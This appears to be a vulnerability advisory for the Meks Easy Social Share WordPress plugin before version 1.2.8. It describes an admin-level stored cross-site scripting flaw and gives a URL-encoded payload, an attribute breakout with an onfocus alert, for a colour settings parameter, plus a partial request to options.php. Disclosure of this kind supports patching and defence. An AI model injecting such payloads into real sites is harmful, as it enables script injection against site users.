## WordPress Plugin Vulnerabilities

# Meks Easy Social Share < 1.2.8 - Admin+ Stored Cross-Site Scripting

### Description

The plugin does not sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks even when the unfiltered\_html capability is disallowed (for example in multisite setup)

### Proof of Concept

Intercept the request made when saving the settings and put the following payload in the meks\_ess\_settings[color][custom\_color] parameter: %23ffd635%22autofocus%20onfocus%3d%22alert(%2fXSS%2f)%22%2f%2f
POST /wp-admin/options.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 634
Connection: close
Cookie: [admin+]
Upgrade-Insecure-Requests: 1

The XSS will be triggered when viewing the settings again
